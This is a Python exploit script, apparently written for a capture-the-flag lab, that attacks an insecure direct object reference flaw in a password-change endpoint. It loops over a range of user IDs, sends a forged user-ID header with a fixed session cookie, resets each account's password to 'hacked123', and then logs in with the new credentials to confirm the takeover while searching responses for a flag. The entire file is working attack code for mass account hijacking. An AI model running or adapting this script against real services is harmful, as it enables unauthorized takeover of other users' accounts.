import requests
import json
import sys

# Configuration
BASE_URL = "http://127.0.0.1:33200"
CHANGE_PASSWORD_ENDPOINT = f"{BASE_URL}/password/test"
LOGIN_ENDPOINT = f"{BASE_URL}/login"

# Authentication data from context
MY_USER_ID = "10032"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfPOA.b4xDl8YHos70T-UyrMaks8tnRhU"

# Headers for password change (authenticated as user 10032)
headers = {
    "X-UserId": MY_USER_ID,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
}

# Cookie jar with our session cookie
cookies = {
    "session": SESSION_COOKIE
}

# Define target user_id ranges to test
target_ranges = [
    range(1, 11),      # 1-10
    range(10030, 10036)  # 10030-10035
]

# Flatten ranges into a single list
target_user_ids = []
for r in target_ranges:
    target_user_ids.extend(list(r))

print(f"[+] Testing IDOR vulnerability on {CHANGE_PASSWORD_ENDPOINT}")
print(f"[+] Authenticated as user ID: {MY_USER_ID}")
print(f"[+] Testing {len(target_user_ids)} user_id values: {target_user_ids[:10]}... (showing first 10)")
print(f"[+] Attempting to change passwords to 'hacked123'")
print("=" * 80)

successful_changes = []

# Test password change for each user_id
for user_id in target_user_ids:
    print(f"\n[+] Testing user_id: {user_id}")
    
    # Prepare password change data
    # Note: Using username="victim" as specified, though this might vary per user
    data = {
        "username": "victim",
        "password": "hacked123",
        "user_id": str(user_id)
    }
    
    try:
        # Send POST request to change password
        response = requests.post(
            CHANGE_PASSWORD_ENDPOINT,
            headers=headers,
            cookies=cookies,
            data=data,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"Status Code: {response.status_code}")
        
        # Check for redirect (common success indicator)
        if response.status_code in [301, 302, 303, 307, 308]:
            print(f"Redirect to: {response.headers.get('Location', 'N/A')}")
        
        # Print response body
        response_text = response.text
        print(f"Response Length: {len(response_text)} bytes")
        print(f"Response Body:\n{response_text[:500]}")
        if len(response_text) > 500:
            print("... (truncated for display)")
        
        # Check for success indicators
        success = False
        if response.status_code == 200:
            if "dashboard" in response_text.lower():
                print("[!] Success: Response mentions 'dashboard'")
                success = True
            elif "password" in response_text.lower() and ("changed" in response_text.lower() or "updated" in response_text.lower()):
                print("[!] Success: Password change confirmed in response")
                success = True
            else:
                print("[-] 200 status but unclear if password was changed")
        elif response.status_code == 302:
            if "/dashboard" in response.headers.get("Location", ""):
                print("[!] Success: Redirect to /dashboard")
                success = True
            else:
                print("[-] Redirect but not to dashboard")
        
        # Check for flags in response
        if "FLAG{" in response_text:
            flag_start = response_text.find("FLAG{")
            flag_end = response_text.find("}", flag_start) + 1
            if flag_start != -1 and flag_end != -1:
                flag = response_text[flag_start:flag_end]
                print(f"\n[!] FLAG FOUND: {flag}")
        
        # Check for error messages that reveal information
        if response.status_code == 400:
            print(f"[-] Bad request - possibly invalid user_id or username mismatch")
        elif response.status_code == 403:
            print(f"[-] Forbidden - access denied for this user_id")
        elif response.status_code == 404:
            print(f"[-] Not found - user_id might not exist")
        elif response.status_code == 500:
            print(f"[-] Server error - potential issue with the request")
        
        if success:
            successful_changes.append(user_id)
            print(f"[!] Successfully changed password for user_id {user_id}")
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed for user_id {user_id}: {e}")
    
    print("-" * 60)

print("\n" + "=" * 80)
print("[+] Summary of Password Change Attempts:")
print(f"[+] Successful changes for user_ids: {successful_changes}")

# For successful changes, attempt to login with the new credentials
if successful_changes:
    print("\n[+] Attempting to confirm exploitation by logging in with changed credentials:")
    
    for user_id in successful_changes:
        print(f"\n[+] Testing login for user_id {user_id} with password 'hacked123'")
        
        # Try to login with the changed credentials
        login_data = {
            "username": f"user{user_id}",  # Assuming username pattern
            "password": "hacked123"
        }
        
        # Also try with victim username
        login_data_victim = {
            "username": "victim",
            "password": "hacked123"
        }
        
        try:
            # Try with assumed username pattern
            login_response = requests.post(
                LOGIN_ENDPOINT,
                data=login_data,
                allow_redirects=False,
                timeout=10
            )
            
            print(f"Login attempt with username 'user{user_id}': Status {login_response.status_code}")
            if login_response.status_code == 302:
                print(f"[!] Login successful with username 'user{user_id}'!")
                if login_response.headers.get("Location"):
                    print(f"Redirect to: {login_response.headers['Location']}")
            
            # Try with victim username
            login_response_victim = requests.post(
                LOGIN_ENDPOINT,
                data=login_data_victim,
                allow_redirects=False,
                timeout=10
            )
            
            print(f"Login attempt with username 'victim': Status {login_response_victim.status_code}")
            if login_response_victim.status_code == 302:
                print(f"[!] Login successful with username 'victim'!")
                if login_response_victim.headers.get("Location"):
                    print(f"Redirect to: {login_response_victim.headers['Location']}")
                    
            # Check responses for flags
            for resp in [login_response, login_response_victim]:
                if "FLAG{" in resp.text:
                    flag_start = resp.text.find("FLAG{")
                    flag_end = resp.text.find("}", flag_start) + 1
                    if flag_start != -1:
                        flag = resp.text[flag_start:flag_end]
                        print(f"\n[!] FLAG FOUND IN LOGIN RESPONSE: {flag}")
                        sys.exit(0)  # Exit on finding flag
                        
        except requests.exceptions.RequestException as e:
            print(f"[-] Login attempt failed for user_id {user_id}: {e}")
else:
    print("\n[-] No successful password changes detected. IDOR may require additional testing.")
    print("[-] Try:")
    print("  - Different payload encoding")
    print("  - Different usernames")
    print("  - Different endpoint paths")
